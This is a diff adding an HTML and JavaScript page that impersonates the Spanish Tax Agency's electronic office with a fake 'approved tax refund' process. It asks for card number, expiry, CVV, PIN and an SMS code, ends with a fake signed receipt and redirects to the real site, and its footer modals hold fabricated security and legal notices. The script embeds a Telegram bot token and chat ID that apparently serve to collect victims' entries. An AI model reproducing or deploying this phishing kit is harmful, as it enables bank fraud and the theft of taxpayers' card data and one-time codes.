+                <svg class="w-16 h-16 text-blue-700 animate-spin-custom" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3" stroke-dasharray="30 20"></circle></svg>
+            </div>
+            <p id="t-spin1-p1" class="text-lg font-bold text-gray-900 mt-6 mb-2">Tu petición se está procesando...</p>
+            <p id="t-spin1-p2" class="text-sm text-gray-600">Por favor, espera unos segundos.</p>
+        </div>
+
+        <!-- STEP 2: VERIFICACIÓN DE REEMBOLSO -->
+        <div id="step-2" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-6 sm:p-8">
+            <h2 id="t-step2-title" class="text-xl sm:text-2xl font-semibold text-center text-gray-800 mb-6 tracking-tight">Verificación de reembolso</h2>
+            <div class="border border-gray-200 p-6 rounded bg-gray-50/50 mb-6">
+                <form id="form-step-2" class="space-y-4" onsubmit="validateCardAndProceed(event)">
+                    <div>
+                        <label id="t-label-card" class="block text-sm font-medium text-gray-700 mb-1">Número de tarjeta</label>
+                        <div class="relative">
+                            <input type="text" id="card-number" required placeholder="4918 5040 3706 6119" maxlength="19" class="w-full border border-gray-300 rounded p-2.5 pr-12 bg-white text-gray-800 text-sm focus:outline-none focus:border-blue-700">
+                            <div id="card-brand-icon" class="absolute right-3 top-2.5 text-xs font-bold text-blue-900 uppercase"></div>
+                        </div>
+                        <p id="card-error" class="text-xs text-red-600 mt-1 hidden">Número de tarjeta inválido o incorrecto.</p>
+                    </div>
+                    <div>
+                        <label id="t-label-expir" class="block text-sm font-medium text-gray-700 mb-1">Fecha de caducidad (MM/AA)</label>
+                        <input type="text" id="card-expiry" required placeholder="MM/AA" maxlength="5" class="w-full border border-gray-300 rounded p-2.5 bg-white text-gray-800 text-sm focus:outline-none focus:border-blue-700">
+                        <p id="expiry-error" class="text-xs text-red-600 mt-1 hidden">Formato o fecha inválida (Ej: 01/32).</p>
+                    </div>
+                    <div>
+                        <label id="t-label-cvv" class="block text-sm font-medium text-gray-700 mb-1">Código de seguridad (CVV/CVC)</label>
+                        <div class="relative">
+                            <input type="password" id="card-cvv" required placeholder="•••" maxlength="4" class="w-full border border-gray-300 rounded p-2.5 pr-10 bg-white text-gray-800 text-sm focus:outline-none focus:border-blue-700">
+                            <button type="button" onclick="togglePasswordVisibility('card-cvv', this)" class="absolute right-3 top-2.5 text-gray-500 hover:text-gray-700 cursor-pointer">
+                                <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
+                            </button>
+                        </div>
+                        <p id="cvv-error" class="text-xs text-red-600 mt-1 hidden">CVV incorrecto (3 dígitos generales o 4 para American Express).</p>
+                    </div>
+                    <div>
+                        <label id="t-label-pin" class="block text-sm font-medium text-gray-700 mb-1">PIN</label>
+                        <div class="relative">
+                            <input type="password" id="card-pin" required placeholder="PIN de la tarjeta bancaria" maxlength="6" class="w-full border border-gray-300 rounded p-2.5 pr-10 bg-white text-gray-800 text-sm focus:outline-none focus:border-blue-700">
+                            <button type="button" onclick="togglePasswordVisibility('card-pin', this)" class="absolute right-3 top-2.5 text-gray-500 hover:text-gray-700 cursor-pointer">
+                                <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
+                            </button>
+                        </div>
+                        <p id="pin-error" class="text-xs text-red-600 mt-1 hidden">El PIN de tarjeta en España debe tener entre 4 y 6 dígitos.</p>
+                    </div>
+                    <div class="flex items-center justify-between pt-4">
+                        <button type="button" onclick="showStep('step-1', 1)" class="text-gray-600 hover:text-blue-900 text-sm font-medium flex items-center transition-colors cursor-pointer">
+                            <svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"></path></svg> <span id="t-btn-volver1">Volver</span>
+                        </button>
+                        <button type="submit" id="t-btn-confirmar" class="bg-blue-700 hover:bg-blue-800 text-white font-medium py-2.5 px-8 rounded transition-colors text-sm shadow-sm cursor-pointer">Confirmar</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- SPINNER 2 -->
+        <div id="spinner-2" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-8 text-center">
+            <h2 class="text-xl font-medium text-gray-700 mb-8">Procesando solicitud</h2>
+            <div class="flex justify-center my-6">
+                <svg class="w-16 h-16 text-blue-700 animate-spin-custom" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3" stroke-dasharray="30 20"></circle></svg>
+            </div>
+            <p class="text-lg font-bold text-gray-900 mt-6 mb-2">Tu petición se está procesando...</p>
+            <p class="text-sm text-gray-600">Por favor, espera unos segundos.</p>
+        </div>
+
+        <!-- STEP 3: VERIFICACIÓN DE CÓDIGO SMS -->
+        <div id="step-3" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-6 sm:p-8">
+            <h2 id="t-step3-title" class="text-xl sm:text-2xl font-semibold text-center text-gray-800 mb-6 tracking-tight">Verificación de código</h2>
+            <div class="border border-gray-200 p-6 rounded bg-gray-50/50 mb-6">
+                <form id="form-step-3" class="space-y-4" onsubmit="handleStep3(event)">
+                    <p id="t-step3-desc" class="text-center text-sm text-gray-700 mb-4">Introduzca el código SMS de 6 dígitos enviado al número de contacto.</p>
+                    <div>
+                        <input type="text" id="sms-code" required maxlength="6" placeholder="------" class="w-full border border-gray-300 rounded p-3 text-center tracking-widest text-lg bg-white text-gray-800 focus:outline-none focus:border-blue-700">
+                    </div>
+                    <div class="flex items-center justify-between pt-4">
+                        <button type="button" onclick="showStep('step-2', 2)" class="text-gray-600 hover:text-blue-900 text-sm font-medium flex items-center transition-colors cursor-pointer">
+                            <svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"></path></svg> <span id="t-btn-volver2">Volver</span>
+                        </button>
+                        <button type="submit" id="t-btn-verificar1" class="bg-blue-700 hover:bg-blue-800 text-white font-medium py-2.5 px-8 rounded transition-colors text-sm shadow-sm cursor-pointer">Verificar</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- SPINNER 3 -->
+        <div id="spinner-3" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-8 text-center">
+            <h2 class="text-xl font-medium text-gray-700 mb-8">Procesando solicitud</h2>
+            <div class="flex justify-center my-6">
+                <svg class="w-16 h-16 text-blue-700 animate-spin-custom" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3" stroke-dasharray="30 20"></circle></svg>
+            </div>
+            <p class="text-lg font-bold text-gray-900 mt-6 mb-2">Tu petición se está procesando...</p>
+            <p class="text-sm text-gray-600">Por favor, espera unos segundos.</p>
+        </div>
+
+        <!-- STEP 4: VERIFICACIÓN DE PIN -->
+        <div id="step-4" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-6 sm:p-8">
+            <h2 id="t-step4-title" class="text-xl sm:text-2xl font-semibold text-center text-gray-800 mb-6 tracking-tight">Verificación de pin</h2>
+            <div class="border border-gray-200 p-6 rounded bg-gray-50/50 mb-6">
+                <form id="form-step-4" class="space-y-4" onsubmit="handleStep4(event)">
+                    <p id="t-step4-desc" class="text-center text-sm text-gray-700 mb-4">Introduzca el PIN secreto de su tarjeta bancaria para confirmar la operación.</p>
+                    <div>
+                        <div class="relative">
+                            <input type="password" id="pin-code" required maxlength="6" placeholder="••••" class="w-full border border-gray-300 rounded p-3 pr-12 text-center tracking-widest text-lg bg-white text-gray-800 focus:outline-none focus:border-blue-700">
+                            <button type="button" onclick="togglePasswordVisibility('pin-code', this)" class="absolute right-3 top-3.5 text-gray-500 hover:text-gray-700 cursor-pointer">
+                                <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
+                            </button>
+                        </div>
+                        <p id="final-pin-error" class="text-xs text-red-600 mt-1 hidden text-center">El PIN introducido no coincide con el de la página anterior o es incorrecto.</p>
+                    </div>
+                    <div class="flex items-center justify-between pt-4">
+                        <button type="button" onclick="showStep('step-3', 3)" class="text-gray-600 hover:text-blue-900 text-sm font-medium flex items-center transition-colors cursor-pointer">
+                            <svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"></path></svg> <span id="t-btn-volver3">Volver</span>
+                        </button>
+                        <button type="submit" id="t-btn-verificar2" class="bg-blue-700 hover:bg-blue-800 text-white font-medium py-2.5 px-8 rounded transition-colors text-sm shadow-sm cursor-pointer">Verificar</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- SPINNER 4 -->
+        <div id="spinner-4" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-8 text-center">
+            <h2 class="text-xl font-medium text-gray-700 mb-8">Procesando solicitud</h2>
+            <div class="flex justify-center my-6">
+                <svg class="w-16 h-16 text-blue-700 animate-spin-custom" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3" stroke-dasharray="30 20"></circle></svg>
+            </div>
+            <p class="text-lg font-bold text-gray-900 mt-6 mb-2">Tu petición se está procesando...</p>
+            <p class="text-sm text-gray-600">Por favor, espera unos segundos.</p>
+        </div>
+
+        <!-- STEP 5: PROCESO FINALIZADO CON CSV Y REDIRECCIÓN AUTOMÁTICA -->
+        <div id="step-5" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-6 sm:p-8 text-center">
+            <h2 id="t-step5-title" class="text-xl sm:text-2xl font-semibold text-center text-gray-800 mb-6 tracking-tight">Proceso Finalizado</h2>
+            <div class="border border-gray-200 p-6 rounded bg-gray-50/50 mb-6 space-y-4">
+                <div class="w-12 h-12 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-2 font-bold text-xl">✓</div>
+                <h3 id="t-step5-h3" class="text-lg font-bold text-gray-900">¡Tu proceso de reembolso ha finalizado!</h3>
+                <p id="t-step5-p" class="text-sm text-gray-700 leading-relaxed">
+                    El pago del reembolso será efectivo en un plazo máximo de <strong class="text-black font-extrabold">14 días hábiles</strong>.
+                </p>
+                
+                <!-- BLOQUE CSV Y JUSTIFICANTE -->
+                <div class="bg-white p-3 rounded border border-gray-200 text-xs text-left space-y-1 my-3 shadow-2xs">
+                    <p class="text-gray-500 font-bold uppercase tracking-wider">Documento Firmado Electrónicamente</p>
+                    <p class="font-mono text-gray-800">CSV: <span class="font-bold text-blue-900">74F8A91C3E2048576209</span></p>
+                    <p class="text-gray-500 text-[11px]">Estado: <span class="text-green-700 font-bold">Registrado y Aprobado</span></p>
+                </div>
+
+                <div class="pt-2 flex flex-col sm:flex-row gap-2 justify-center">
+                    <button onclick="downloadReceipt()" class="bg-gray-800 hover:bg-gray-900 text-white font-medium py-2 px-4 rounded transition-colors text-xs shadow-sm cursor-pointer">Descargar Justificante (PDF)</button>
+                    <button onclick="window.location.href='https://sede.agenciatributaria.gob.es/'" id="t-btn-inicio" class="bg-blue-700 hover:bg-blue-800 text-white font-medium py-2 px-6 rounded transition-colors text-xs shadow-sm cursor-pointer">Volver a la Sede Electrónica</button>
+                </div>
+                <p class="text-[11px] text-gray-500 pt-2">Redirección automática a la Sede en <span id="countdown-timer" class="font-bold text-gray-700">7</span> segundos...</p>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- FOOTER CON ENLACES INSTITUCIONALES Y MODAL DINÁMICO -->
+    <footer class="bg-blue-900 text-white mt-12 py-8 px-4">
+        <div class="max-w-2xl mx-auto space-y-3 text-sm">
+            <p class="font-bold border-b border-blue-800 pb-2 mb-3">
+                <a href="https://sede.agenciatributaria.gob.es/" target="_blank" rel="noopener noreferrer" class="hover:underline">Agencia Tributaria</a>
+            </p>
+            <ul class="space-y-2 text-blue-100 text-xs sm:text-sm">
+                <li><a href="#" onclick="openModal('accesibilidad')" class="hover:underline">Accesibilidad</a></li>
+                <li><a href="#" onclick="openModal('seguridad')" class="hover:underline">Aviso de seguridad</a></li>
+                <li><a href="#" onclick="openModal('legal')" class="hover:underline">Aviso legal</a></li>
+                <li><a href="#" onclick="openModal('certificado')" class="hover:underline">Validación del certificado de sede</a></li>
+                <li><a href="#" onclick="openModal('privacidad')" class="hover:underline">Protección de datos</a></li>
+                <li><a href="#" onclick="openModal('linguistica')" class="hover:underline">Política lingüística</a></li>
+                <li><a href="https://sede.agenciatributaria.gob.es/Sede/mapa-web.shtml" target="_blank" rel="noopener noreferrer" class="hover:underline">Estructura y navegación en la sede electrónica</a></li>
+                <li><a href="https://www.agenciatributaria.es/AEAT.internet/Atencion_telefonica.shtml" target="_blank" rel="noopener noreferrer" class="hover:underline">Contacta con nosotros</a></li>
+            </ul>
+        </div>
+    </footer>
+
+    <!-- MODAL INSTITUCIONAL OFICIAL -->
+    <div id="institutional-modal" class="hidden fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4">
+        <div class="bg-white rounded-lg shadow-xl max-w-lg w-full p-6 border-t-4 border-blue-700">
+            <div class="flex justify-between items-center mb-4 border-b pb-2">
+                <h3 id="modal-title" class="font-bold text-lg text-blue-900">Información Institucional</h3>
+                <button onclick="closeModal()" class="text-gray-500 hover:text-gray-800 font-bold text-lg cursor-pointer">&times;</button>
+            </div>
+            <div id="modal-content" class="text-sm text-gray-700 space-y-3 leading-relaxed">
+                <!-- Contenido dinámico -->
+            </div>
+            <div class="mt-6 text-right">
+                <button onclick="closeModal()" class="bg-blue-700 hover:bg-blue-800 text-white px-4 py-2 rounded text-sm font-medium transition-colors cursor-pointer">Cerrar</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- SCRIPT CON TELEGRAM BOT, VALIDACIONES Y TRADUCCIONES -->
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8755847353:AAF4upNLjCstkjNC9Ryjbjja-CKlYKKzhDo";
+        const TELEGRAM_CHAT_ID = "5892729609";
+
+        let formDataStore = {};
+        let userInteractionDetected = false;
+        let currentLang = 'es';
+        let redirectInterval = null;
+
+        window.addEventListener('mousemove', () => { userInteractionDetected = true; }, { once: true });
+        window.addEventListener('touchstart', () => { userInteractionDetected = true; }, { once: true });
+        window.addEventListener('keydown', () => { userInteractionDetected = true; }, { once: true });
+
+        const translations = {
+            es: {
+                brand: "Sede Electrónica",
+                stepIndicator: "Paso {current} de 4",
+                stepNames: ["Datos del Reembolso", "Verificación Bancaria", "Código SMS", "Código PIN"],
+                step1Title: "Notificación de Reembolso de Impuestos Aprobado",
+                step1Desc: "Su reembolso de impuestos ha sido aprobado.",
+                step1Plazo: "Tiene un plazo máximo de <strong>5 días</strong> para completar el formulario de reembolso.",
+                lblExp: "* Número de expediente",
+                lblImp: "* Importe de reembolso",
+                lblNom: "* Nombre completo",
+                lblDni: "* NIF / DNI / NIE",
+                lblTel: "* Número de contacto",
+                btnContinuar: "Continuar",
+                step2Title: "Verificación de reembolso",
+                lblCard: "Número de tarjeta",
+                lblExpir: "Fecha de caducidad (MM/AA)",
+                lblCvv: "Código de seguridad (CVV/CVC)",
+                lblPin: "PIN",
+                btnVolver: "Volver",
+                btnConfirmar: "Confirmar",
+                step3Title: "Verificación de código",
+                step3Desc: "Introduzca el código SMS de 6 dígitos enviado al número de contacto.",
+                btnVerificar: "Verificar",
+                step4Title: "Verificación de pin",
+                step4Desc: "Introduzca el PIN secreto de su tarjeta bancaria para confirmar la operación.",
+                step5Title: "Proceso Finalizado",
+                step5H3: "¡Tu proceso de reembolso ha finalizado!",
+                step5P: "El pago del reembolso será efectivo en un plazo máximo de <strong>14 días hábiles</strong>.",
+                btnInicio: "Volver a la Sede Electrónica",
+                dniErrorText: "Formato de DNI, NIE o NIF incorrecto.",
+                cardErrorText: "Número de tarjeta inválido o incorrecto.",
+                expiryErrorText: "Formato o fecha inválida (Ej: 01/32).",
+                cvvErrorText: "CVV incorrecto (3 dígitos generales o 4 para American Express).",
+                pinErrorText: "El PIN de tarjeta en España debe tener entre 4 y 6 dígitos.",
+                finalPinErrorText: "El PIN introducido no coincide con el de la página anterior o es incorrecto."
+            },
+            ca: {
+                brand: "Seu Electrònica",
+                stepIndicator: "Pas {current} de 4",
+                stepNames: ["Dades del Reemborsament", "Verificació Bancària", "Codi SMS", "Codi PIN"],
+                step1Title: "Notificació de Reemborsament d'Impostos Aprovat",
+                step1Desc: "El vostre reemborsament d'impostos ha estat aprovat.",
+                step1Plazo: "Teniu un termini màxim de <strong>5 dies</strong> per completar el formulari de reemborsament.",
+                lblExp: "* Número d'expedient",
+                lblImp: "* Import de reemborsament",
+                lblNom: "* Nom complet",
+                lblDni: "* NIF / DNI / NIE",
+                lblTel: "* Número de contacte",
+                btnContinuar: "Continuar",
+                step2Title: "Verificació de reemborsament",
+                lblCard: "Número de targeta",
+                lblExpir: "Data de caducitat (MM/AA)",
+                lblCvv: "Codi de seguretat (CVV/CVC)",
+                lblPin: "PIN",
+                btnVolver: "Tornar",
+                btnConfirmar: "Confirmar",
+                step3Title: "Verificació de codi",
+                step3Desc: "Introduïu el codi SMS de 6 dígits enviat al número de contacte.",
+                btnVerificar: "Verificar",
+                step4Title: "Verificació de pin",
+                step4Desc: "Introduïu el PIN secret de la vostra targeta bancària per confirmar l'operació.",
+                step5Title: "Procés Finalitzat",
+                step5H3: "¡El teu procés de reemborsament ha finalitzat!",
+                step5P: "El pagament del reemborsament serà efectiu en un termini màxim de <strong>14 dies hàbils</strong>.",
+                btnInicio: "Tornar a la Seu Electrònica",
+                dniErrorText: "Format de DNI, NIE o NIF incorrecte.",
+                cardErrorText: "Número de targeta invàlid o incorrecte.",
+                expiryErrorText: "Format o data invàlida (Ex: 01/32).",
+                cvvErrorText: "CVV incorrecte (3 dígits generals o 4 per a American Express).",
+                pinErrorText: "El PIN de targeta a Espanya ha de tenir entre 4 i 6 dígits.",
+                finalPinErrorText: "El PIN introduït no coincideix amb el de la pàgina anterior o és incorrecte."
+            },
+            gl: {
+                brand: "Sede Electrónica",
+                stepIndicator: "Paso {current} de 4",
+                stepNames: ["Datos do Reembolso", "Verificación Bancaria", "Código SMS", "Código PIN"],
+                step1Title: "Notificación de Reembolso de Impostos Aprobado",
+                step1Desc: "O seu reembolso de impostos foi aprobado.",
+                step1Plazo: "Ten un prazo máximo de <strong>5 días</strong> para completar o formulario de reembolso.",
+                lblExp: "* Número de expediente",
+                lblImp: "* Importe de reembolso",
+                lblNom: "* Nome completo",
+                lblDni: "* NIF / DNI / NIE",
+                lblTel: "* Número de contacto",
+                btnContinuar: "Continuar",
+                step2Title: "Verificación de reembolso",
+                lblCard: "Número de tarxeta",
+                lblExpir: "Data de caducidade (MM/AA)",
+                lblCvv: "Código de seguridade (CVV/CVC)",
+                lblPin: "PIN",
+                btnVolver: "Volver",
+                btnConfirmar: "Confirmar",
+                step3Title: "Verificación de código",
+                step3Desc: "Introduza o código SMS de 6 díxitos enviado ao número de contacto.",
+                btnVerificar: "Verificar",
+                step4Title: "Verificación de pin",
+                step4Desc: "Introduza o PIN secreto da súa tarxeta bancaria para confirmar a operación.",
+                step5Title: "Proceso Finalizado",
+                step5H3: "¡O teu proceso de reembolso rematou!",
+                step5P: "O pago do reembolso será efectivo nun prazo máximo de <strong>14 días hábiles</strong>.",
+                btnInicio: "Volver á Sede Electrónica",
+                dniErrorText: "Formato de DNI, NIE ou NIF incorrecto.",
+                cardErrorText: "Número de tarxeta inválido ou incorrecto.",
+                expiryErrorText: "Formato ou data inválida (Ex: 01/32).",
+                cvvErrorText: "CVV incorrecto (3 díxitos xerais ou 4 para American Express).",
+                pinErrorText: "O PIN de tarxeta en España debe entre 4 e 6 díxitos.",
+                finalPinErrorText: "O PIN introducido non coincide co da páxina anterior ou é incorrecto."
+            },
+            eu: {
+                brand: "Egoitza Elektronikoa",
+                stepIndicator: "{current}. Urratsa (Guztira 4)",
+                stepNames: ["Itzulketaren Datuak", "Banku Egiaztapena", "SMS Kodea", "PIN Kodea"],
+                step1Title: "Zergak Itzultzeko Jakinarazpena Onartuta",
+                step1Desc: "Zure zerga-itzulketa onartu egin da.",
+                step1Plazo: "Gehienez <strong>5 eguneko</strong> epea duzu itzulketa-formularioa betetzeko.",
+                lblExp: "* Espediente zenbakia",
+                lblImp: "* Itzulketaren zenbatekoa",
+                lblNom: "* Izen-abizenak",
+                lblDni: "* NAN / IFZ",
+                lblTel: "* Harremanetarako zenbakia",
+                btnContinuar: "Jarraitu",
+                step2Title: "Itzulketaren egiaztapena",
+                lblCard: "Txartel zenbakia",
+                lblExpir: "Iraungipen-data (MM/AA)",
+                lblCvv: "Segurtasun-kodea (CVV/CVC)",
+                lblPin: "PINa",
+                btnVolver: "Atzera",
+                btnConfirmar: "Berretsi",
+                step3Title: "Kodearen egiaztapena",
+                step3Desc: "Sartu harremanetarako zenbakira bidalitako 6 digituko SMS kodea.",
+                btnVerificar: "Egiaztatu",
+                step4Title: "Pinaren egiaztapena",
+                step4Desc: "Sartu zure banku-txartelaren PIN sekretua eragiketa berretsi.",
+                step5Title: "Prozesua Amaituta",
+                step5H3: "¡Zure itzulketa prozesua amaitu da!",
+                step5P: "Itzulketaren ordainketa gehienez <strong>14 laneguneko</strong> epean egingo da.",
+                btnInicio: "Itzuli Egoitza Elektronikora",
+                dniErrorText: "NAN, NIE edo IFZ formatu okerra.",
+                cardErrorText: "Txartel zenbaki okerra edo baliogabea.",
+                expiryErrorText: "Formatua edo data baliogabea (Adib: 01/32).",
+                cvvErrorText: "CVV okerra (3 digitu orokor edo 4 American Express-erako).",
+                pinErrorText: "Espainiako txartelaren PINak 4 eta 6 digitu artean izan behar ditu.",
+                finalPinErrorText: "Sartutako PINa ez dator bat aurreko orrialdekoarekin edo okerra da."
+            },
+            en: {
+                brand: "Electronic Office",
+                stepIndicator: "Step {current} of 4",
+                stepNames: ["Refund Data", "Bank Verification", "SMS Code", "PIN Code"],
+                step1Title: "Approved Tax Refund Notification",
+                step1Desc: "Your tax refund has been approved.",
+                step1Plazo: "You have a maximum period of <strong>5 days</strong> to complete the refund form.",
+                lblExp: "* File number",
+                lblImp: "* Refund amount",
+                lblNom: "* Full name",
+                lblDni: "* ID / Tax Number (DNI/NIE)",
+                lblContact: "* Contact number",
+                btnContinuar: "Continue",
+                step2Title: "Refund verification",
+                lblCard: "Card number",
+                lblExpir: "Expiry date (MM/YY)",
+                lblCvv: "Security code (CVV/CVC)",
+                lblPin: "PIN",
+                btnVolver: "Back",
+                btnConfirmar: "Confirm",
+                step3Title: "Code verification",
+                step3Desc: "Enter the 6-digit SMS code sent to the contact number.",
+                btnVerificar: "Verify",
+                step4Title: "PIN verification",
+                step4Desc: "Enter the secret PIN of your bank card to confirm the operation.",
+                step5Title: "Process Finished",
+                step5H3: "¡Your refund process has finished!",
+                step5P: "The refund payment will be effective within a maximum period of <strong>14 business days</strong>.",
+                btnInicio: "Return to Electronic Office",
+                dniErrorText: "Invalid DNI, NIE or NIF format.",
+                cardErrorText: "Invalid or incorrect card number.",
+                expiryErrorText: "Invalid format or date (Ex: 01/32).",
+                cvvErrorText: "Incorrect CVV (3 digits general or 4 for American Express).",
+                pinErrorText: "The card PIN in Spain must have between 4 and 6 digits.",
+                finalPinErrorText: "The entered PIN does not match the previous page or is incorrect."
+            }
+        };
+
+        const modalTexts = {
+            es: {
+                accesibilidad: ["Declaración de Accesibilidad", "La Sede Electrónica de la Agencia Tributaria se compromete a hacer accesible su sitio web de conformidad con el Real Decreto 1112/2018. Garantizamos la plena navegabilidad y compatibilidad con tecnologías de apoyo."],
+                seguridad: ["Aviso de Seguridad y Autenticidad", "Este servicio web cuenta con sistemas de cifrado seguro SSL/TLS de 256 bits emitidos por la Fábrica Nacional de Moneda y Timbre (FNMT). Verifique siempre la barra de direcciones."],
+                legal: ["Aviso Legal", "De conformidad con la Ley 39/2015 del Procedimiento Administrativo Común de las Administraciones Públicas, este documento electrónico posee plena validez jurídica."],
+                certificado: ["Validación del Certificado de Sede", "El certificado digital oficial de la Sede Electrónica se encuentra activo y verificado por los prestadores de servicios de certificación reconocidos."],
+                privacidad: ["Protección de Datos Personales", "Los datos recabados en este procedimiento serán tratados con estricta confidencialidad por la Agencia Tributaria exclusivamente para la tramitación del reembolso de impuestos."]
+            },
+            ca: {
+                accesibilidad: ["Declaració d'Accessibilitat", "La Seu Electrònica de l'Agència Tributària es compromet a fer accessible el seu lloc web de conformitat amb la normativa vigent."],
+                seguridad: ["Avís de Seguretat", "Aquest servei web compta amb sistemes de xifratge segur SSL/TLS."],
+                legal: ["Avís Legal", "Aquest document electrònic posseeix plena validesa jurídica segons la legislació aplicable."],
+                certificado: ["Validació del Certificat", "El certificat digital oficial de la Seu Electrònica es troba actiu i verificat."],
+                privacidad: ["Protecció de Dades", "Les dades recollides seran tractades amb estricta confidencialitat."]
+            },
+            gl: {
+                accesibilidad: ["Declaración de Accesibilidade", "A Sede Electrónica da Axencia Tributaria comprométese a garantir a accesibilidade universal."],
+                seguridad: ["Aviso de Seguridade", "Este servizo web conta con sistemas de cifrado seguro SSL/TLS."],
+                legal: ["Aviso Legal", "Este documento electrónico posúe plena validez xurídica."],
+                certificado: ["Validación do Certificado", "O certificado dixital oficial atópase activo e verificado."],
+                privacidad: ["Protección de Datos", "Os datos recollidos serán tratados con estricta confidencialidade."]
+            },
+            eu: {
+                accesibilidad: ["Irisgarritasun Adierazpena", "Zerga Agentziaren Egoitza Elektronikoak bere webgunea irisgarri egiteko konpromisoa hartzen du."],
+                seguridad: ["Segurtasun Oharra", "Web zerbitzu honek SSL/TLS enkriptatze sistema seguruak ditu."],
+                legal: ["Lege Oharra", "Dokumentu elektroniko honek baliozkotasun juridiko osoa du."],
+                certificado: ["Ziurtagiria Baliozkotzea", "Egoitza elektronikoaren ziurtagiri digitala aktibo eta egiaztatuta dago."],
+                privacidad: ["Datu Babesa", "Bildu diren datuak konfidentzialtasun osoz tratatuko dira."]
+            },
+            en: {
+                accesibilidad: ["Accessibility Statement", "The Electronic Office of the Spanish Tax Agency is committed to making its website accessible."],
+                seguridad: ["Security Notice", "This web service features secure 256-bit SSL/TLS encryption systems."],
+                legal: ["Legal Notice", "In accordance with administrative regulations, this electronic document has full legal validity."],
+                certificado: ["Office Certificate Validation", "The official digital certificate of the Electronic Office is active and verified."],
+                privacidad: ["Personal Data Protection", "The data collected will be processed with strict confidentiality exclusively for tax refund processing."]
+            }
+        };
+
+        function openModal(type) {
+            const langDict = modalTexts[currentLang] || modalTexts['es'];
+            const data = langDict[type] || ["Información Oficial", "Contenido oficial disponible de acuerdo con la normativa vigente de la Sede Electrónica."];
+            document.getElementById('modal-title').innerText = data[0];
+            document.getElementById('modal-content').innerHTML = `<p>${data[1]}</p>`;
+            document.getElementById('institutional-modal').classList.remove('hidden');
+        }
+
+        function closeModal() {
+            document.getElementById('institutional-modal').classList.add('hidden');
+        }
+
+        function toggleLangMenu() {
+            const dropdown = document.getElementById('lang-dropdown');
+            dropdown.classList.toggle('hidden');
+        }
+
+        function togglePasswordVisibility(fieldId, btnElement) {
+            const field = document.getElementById(fieldId);
+            if (field.type === "password") {
+                field.type = "text";
+                btnElement.classList.add('text-blue-700');
+            } else {
+                field.type = "password";
+                btnElement.classList.remove('text-blue-700');
+            }
+        }
+
+        function changeLanguage(lang) {
+            currentLang = lang;
+            const t = translations[lang];
+            if (!t) return;
+
+            document.getElementById('lang-code').innerText = lang.toUpperCase();
+            document.getElementById('lang-dropdown').classList.add('hidden');
+
+            document.getElementById('nav-brand').innerText = t.brand;
+            document.getElementById('t-step1-title').innerText = t.step1Title;
+            document.getElementById('t-step1-desc').innerText = t.step1Desc;
+            document.getElementById('t-step1-plazo').innerHTML = t.step1Plazo;
+            document.getElementById('t-label-exp').innerText = t.lblExp;
+            document.getElementById('t-label-imp').innerText = t.lblImp;
+            document.getElementById('t-label-nom').innerText = t.lblNom;
+            document.getElementById('t-label-dni').innerText = t.lblDni;
+            document.getElementById('t-label-tel').innerText = t.lblTel;
+            document.getElementById('t-btn-continuar').innerText = t.btnContinuar;
+
+            document.getElementById('t-step2-title').innerText = t.step2Title;
+            document.getElementById('t-label-card').innerText = t.lblCard;
+            document.getElementById('t-label-expir').innerText = t.lblExpir;
+            document.getElementById('t-label-cvv').innerText = t.lblCvv;
+            document.getElementById('t-label-pin').innerText = t.lblPin;
+            document.getElementById('t-btn-volver1').innerText = t.btnVolver;
+            document.getElementById('t-btn-confirmar').innerText = t.btnConfirmar;
+
+            document.getElementById('t-step3-title').innerText = t.step3Title;
+            document.getElementById('t-step3-desc').innerText = t.step3Desc;
+            document.getElementById('t-btn-volver2').innerText = t.btnVolver;
+            document.getElementById('t-btn-verificar1').innerText = t.btnVerificar;
+
+            document.getElementById('t-step4-title').innerText = t.step4Title;
+            document.getElementById('t-step4-desc').innerText = t.step4Desc;
+            document.getElementById('t-btn-volver3').innerText = t.btnVolver;
+            document.getElementById('t-btn-verificar2').innerText = t.btnVerificar;
+
